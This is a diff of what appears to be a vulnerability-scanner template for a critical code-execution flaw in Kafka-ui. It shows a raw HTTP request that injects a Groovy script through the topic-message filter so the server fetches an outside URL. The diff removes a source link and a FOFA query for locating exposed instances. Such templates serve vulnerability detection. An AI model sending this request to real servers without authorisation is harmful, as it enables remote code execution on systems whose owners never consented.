@@ -3,12 +3,8 @@ info:
   name: Kafka-ui 代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/qihihew1f3zlhqrc'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: qihihew1f3zlhqrc
-    fofa: app="kafka-ui"
 http:
 - raw:
   - 'GET /api/clusters/local/topics/__consumer_offsets/messages?q=new%20URL%28%22https%3A//www.baidu.com/%22%29.text&filterQueryType=GROOVY_SCRIPT&attempt=2&limit=100&page=0&seekDirection=FORWARD&keySerde=String&valueSerde=String&seekType=BEGINNING HTTP/1.1
